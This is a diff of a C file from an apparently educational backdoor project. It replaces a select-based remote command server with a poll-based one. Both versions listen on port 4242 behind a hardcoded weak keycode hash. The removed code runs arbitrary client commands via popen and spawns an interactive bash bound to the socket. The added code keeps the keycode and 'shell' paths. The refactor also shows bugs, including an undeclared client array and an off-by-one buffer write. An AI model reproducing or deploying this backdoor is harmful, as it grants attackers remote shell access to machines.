@@ -1,255 +1,131 @@
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include <sys/select.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <stdio.h>
+# include "ft_shield.h"
 
-void execute_command(const char* command, int client_socket) 
+void init_server(Server *server, int port_number, const char *password) 
 {
-    char buffer[1024];
-    FILE* fp;
-    int status;
-
-    if (strcmp(command, "?") == 0) 
-    {
-        send(client_socket, "? show help\n", 13, 0);
-        send(client_socket, "$> ", 3, 0);
-        return;
-    }
-    if (strcmp(command, "shell") == 0) 
-    {
-        send(client_socket, "Spawning shell on port 4242\n", 29, 0);
-        send(client_socket, "$> ", 3, 0);
-        return;
-    }
-
-
-    fp = popen(command, "r");
-    if (fp == NULL) 
-    {
-        send(client_socket, "Error executing command\n", 25, 0);
-        return;
-    }
-    while (fgets(buffer, sizeof(buffer), fp))
-    {
-        send(client_socket, buffer, strlen(buffer), 0);
-        send(client_socket, "$> ", 3, 0);
-    }
-    
-    status = pclose(fp);
-    if (status != 0) 
-    {
-        char error_message[1024];
-        snprintf(error_message, sizeof(error_message), "sh: %s: command not found\n", command);
-        send(client_socket, error_message, strlen(error_message), 0);
-        send(client_socket, "$> ", 3, 0);
-    }
+    server->_port_number = port_number;
+    server->_password = strdup(password);
 }
 
-void launch_shell(int client_socket)
+void create_socket(Server *server) 
 {
-    char buffer[1024];
-
-    if (setenv("PS1", "$> ", 1) != 0) {
-        perror("setenv failed");
-    }
-    dup2(client_socket, STDIN_FILENO);
-    dup2(client_socket, STDOUT_FILENO);
-    dup2(client_socket, STDERR_FILENO);
-
-    execl("/bin/bash", "bash", "-i", NULL);
-}
-
-void hash(char *password, char *hash)
-{
-    int hash_value;
-    int i;
-
-    i = 0;
-    hash_value = 0;
-    while(i < strlen(password))
-    {
-        hash_value = (hash_value * 54) + (char)password[i];
-        i++;
-    }
-    snprintf(hash, 1024, "%08x", hash_value);
-}
-
-int authenticate(int client_socket)
-{
-    char buffer[1024];
-    char password[1024];
-    int valread;
-
-    while (1)
-    {
-        send(client_socket, "Keycode: ", 9, 0);
-        valread = read(client_socket, buffer, 1024);
-        if (valread <= 0) {
-            send(client_socket, "Failed to read password. Disconnecting...\n", 42, 0);
-            close(client_socket);
-            return (0);
-        }
-
-        buffer[valread] = '\0';
-        if (buffer[valread - 1] == '\n') {
-            buffer[valread - 1] = '\0';
-        }
-
-        hash(buffer, password);
-        if (strcmp(password, "007f3592") == 0) {
-            return (1);
-        } 
-    }
-}
-
-int create_socket() {
-    int socketfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (socketfd == -1) {
-        perror("failed to create socket");
+    int opt = 1;
+    server->_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (server->_socket_fd < 0) {
+        perror("ERROR OPENING SOCKET");
         exit(EXIT_FAILURE);
     }
-    return socketfd;
-}
-
-void bind_socket(int socketfd, struct sockaddr_in* address) {
-    address->sin_family = AF_INET;
-    address->sin_addr.s_addr = INADDR_ANY;
-    address->sin_port = htons(4242);
-
-    if(bind(socketfd, (struct sockaddr*)address, sizeof(*address)) < 0) {
-        perror("bind failed");
-        close(socketfd);
+    if (setsockopt(server->_socket_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+        perror("ERROR OPENING SETSOCKETOPT");
         exit(EXIT_FAILURE);
     }
 }
 
-void listen_socket(int socketfd) {
-    if(listen(socketfd, 3) < 0) {
-        perror("listen failed");
-        close(socketfd);
-        exit(EXIT_FAILURE);
-    }
-}
-
-int accept_socket(int server_fd, struct sockaddr_in* address, int addrlen, int *client_socket) {
-    int new_socket;
-    int i;
-
-    i = 0;
-    if((new_socket = accept(server_fd, (struct sockaddr*)address, (socklen_t*)&addrlen)) < 0) {
-        perror("Accept failed");
-        exit(EXIT_FAILURE);
-    }
-    while (i < 3)
-    {
-        if (client_socket[i] == 0)
-        {
-            client_socket[i] = new_socket;
-            break;
-        }
-        i++;
-    }
-    return new_socket;
-}
-
-void read_write(int *client_socket, int client_fd, char* buffer) {
-    int valread;
-    int i;
-
-    i = 0;
-    send(client_fd, "$> ", 3, 0);
-    if ((valread = read(client_fd, buffer, 1024)) == 0) {
-        close(client_fd);
-        while (i < 3)
-        {
-            if (client_socket[i] == client_fd)
-            {
-                client_socket[i] = 0;
-                break;
-            }
-            i++;
-        }
-    }
-    else {
-        buffer[valread] = '\0';
-        if (buffer[valread - 1] == '\n')
-            buffer[valread - 1] = '\0';
-        execute_command(buffer, client_fd);
-    }
-}
-
-int main(void)
+void bind_socket(Server *server)
 {
-    int i;
-    int server_fd;
-    int socket_id;
-    int max_sd;
-    int activity;
-    int new_socket;
-    int client_socket[3];
-    char buffer[1024] = {0};
-    fd_set readfds;
-    struct sockaddr_in addr;
-    int addrlen = sizeof(addr);
-
-    i = 0;
-    while (i < 3)
-    {
-        client_socket[i] = 0;
-        i++;
+    memset((char *)&server->_serv_addr, 0, sizeof(server->_serv_addr));
+    server->_serv_addr.sin_family = AF_INET;
+    server->_serv_addr.sin_addr.s_addr = INADDR_ANY;
+    server->_serv_addr.sin_port = htons(server->_port_number);
+    if (bind(server->_socket_fd, (struct sockaddr *)&server->_serv_addr, sizeof(server->_serv_addr)) < 0) {
+        perror("ERROR ON BINDING");
+        exit(EXIT_FAILURE);
     }
+}
 
-    server_fd = create_socket();
-    bind_socket(server_fd, &addr);
-    listen_socket(server_fd);
+void listen_socket(Server *server)
+{
+    if (listen(server->_socket_fd, MAX_CLIENTS) < 0) {
+        perror("ERROR ON LISTEN");
+        exit(EXIT_FAILURE);
+    }
+}
 
-    while (1)
-    {
-        FD_ZERO(&readfds);
-        FD_SET(server_fd, &readfds);
-        max_sd = server_fd;
+void close_socket(int socket_fd)
+{
+    close(socket_fd);
+}
 
-        i = 0;
-        while (i < 3)
+void read_write_socket(Client* client_arr,  int sock, int *numfds)
+{
+    int n;
+    char buffer[BUFFER_SIZE];
+    bzero(buffer, BUFFER_SIZE);
+    n = recv(sock, buffer, BUFFER_SIZE, 0);
+    if (n == 0) {
+        close(sock);
+        remove_client(client_arr, sock);
+        (*numfds)--;
+    }
+    if (n < 0) {
+        perror("ERROR READING FROM SOCKET");
+        exit(EXIT_FAILURE);
+    }
+    if (n > 1) {
+        buffer[n] = '\0';
+        if (buffer[n - 1] == '\n')
+            buffer[n - 1] = '\0';
+        if (strcmp(buffer, "?") == 0) 
         {
-            socket_id = client_socket[i];
-            if (socket_id > 0){
-                FD_SET(socket_id, &readfds);
-            }
-            if (socket_id > max_sd){
-                max_sd = socket_id;
-            }
-            i++;
+            send(sock, "? show help\n", 13, 0);
         }
-        activity = select(max_sd + 1, &readfds, NULL, NULL, NULL);
-        if ((activity < 0) && (errno != EINTR)) { 
-            perror("select error"); 
-        }
-        if (FD_ISSET(server_fd, &readfds)) {
-            new_socket = accept_socket(server_fd, &addr, addrlen, client_socket);
-            if(authenticate(new_socket))
-            {
-                FD_SET(new_socket, &readfds);
-            }
-            // authenticate(new_socket);
-
-        }
-        i = 0;
-        while (i < 3)
+        else if (strcmp(buffer, "shell") == 0) 
         {
-            socket_id = client_socket[i];
-            if (FD_ISSET(socket_id, &readfds)) {
-                // launch_shell(socket_id);
-                read_write(client_socket, socket_id, buffer);
-            }
-            i++;
+            send(sock, "Spawning shell on port 4242\n", 29, 0);
+            launch_shell(sock, client_arr, numfds);
         }
     }
-    close(server_fd);
-    return (0);
+}
+
+void accept_socket(Server *server)
+{
+    int numfds = 1;
+    int client_length = sizeof(server->_cli_addr);
+    server->_fds[0].fd = server->_socket_fd;
+    server->_fds[0].events = POLLIN;
+
+    while (1) {
+        int ret = poll(server->_fds, numfds, -1);
+        if (ret < 0) {
+            perror("ERROR ON POLL");
+            exit(EXIT_FAILURE);
+        }
+
+        for (int i = 0; i < numfds; i++) {
+            if (server->_fds[i].revents & POLLIN) {
+                if (server->_fds[i].fd == server->_socket_fd) {
+                    server->_new_socket_fd = accept(server->_socket_fd, (struct sockaddr *)&server->_cli_addr, (socklen_t *)&client_length);
+                    if (server->_new_socket_fd < 0) {
+                        perror("ERROR ON ACCEPT");
+                        exit(EXIT_FAILURE);
+                    }
+                    if (numfds > MAX_CLIENTS) {
+                        close(server->_new_socket_fd);
+                    } else {
+                        server->_fds[numfds].fd = server->_new_socket_fd;
+                        server->_fds[numfds].events = POLLIN;
+                        numfds++;
+                        add_client(client_arr, server->_new_socket_fd);
+                        send(server->_new_socket_fd, "Keycode: ", 9, 0);
+                    }
+                } else {
+                    if (!is_autheticated(client_arr, server->_fds[i].fd)){
+                        if(authenticate(server->_fds[i].fd, client_arr, &numfds)){
+                            make_autheticated(client_arr, server->_fds[i].fd);
+                        }
+                    } else {
+                        read_write_socket(client_arr, server->_fds[i].fd, &numfds);
+                    }
+                }
+            }
+        }
+    }
+}
+
+void server() {
+    Server server;
+    init_server(&server, 4242, AUTH_PASSWORD_HASH);
+    create_socket(&server);
+    bind_socket(&server);
+    listen_socket(&server);
+    accept_socket(&server);
 }
